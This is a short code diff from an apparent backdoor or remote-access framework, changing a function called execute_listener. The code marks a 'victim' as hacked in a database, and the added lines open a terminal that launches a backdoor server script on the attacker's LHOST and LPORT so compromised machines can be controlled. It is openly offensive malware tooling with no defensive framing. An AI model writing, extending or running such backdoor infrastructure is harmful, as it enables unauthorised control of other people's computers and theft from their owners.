@@ -169,14 +169,12 @@ def execute_listener(settings):
                 command = "UPDATE `users` SET `hack` = 1 WHERE `p_id` = {}".format(settings['PID'])
                 my_cursor.execute(command)
                 print(colors.Green + '[✔]Selected victim setteled successfully' + colors.RESET)
-
-                #############################################
-                #############################################
-                ##### PYTHON 2 SERVER INSTANCE RUNS HERE ####
-                #############################################
-                #############################################
                 hacker_database.commit()
             
+
+                # start external terminal to hack
+                call("gnome-terminal -x bash -c 'python2 libs/backdoor/server.py {} {};exit; exec bash'".format(settings['LHOST'], settings['LPORT']), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)
+
             except Exception as error:
                 print(colors.Red + '[✘]Error occured while setting the victim read error\n[✘]Error: {}'.format(error))
         except Exception as error:
